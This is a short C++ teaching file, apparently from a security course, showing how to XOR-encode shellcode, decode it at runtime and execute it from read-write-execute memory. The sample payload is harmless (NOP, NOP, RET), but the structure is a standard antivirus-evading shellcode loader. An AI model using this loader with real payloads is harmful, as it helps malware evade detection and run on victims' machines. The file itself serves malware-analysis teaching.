// Filename: xor_shellcode.cpp
// Purpose: Obfuscate shellcode using simple XOR and execute it.
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <vector>
#include <iostream>

void xorDecrypt(std::vector<BYTE>& data, BYTE key) {
    for (auto& b : data)
        b ^= key;
}

int main() {
    BYTE encrypted[] = { 0x90 ^ 0xAB, 0x90 ^ 0xAB, 0xC3 ^ 0xAB }; // NOP, NOP, RET
    std::vector<BYTE> shellcode(encrypted, encrypted + sizeof(encrypted));
    
    xorDecrypt(shellcode, 0xAB);

    void* mem = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());
    ((void(*)())mem)();

    return 0;
}
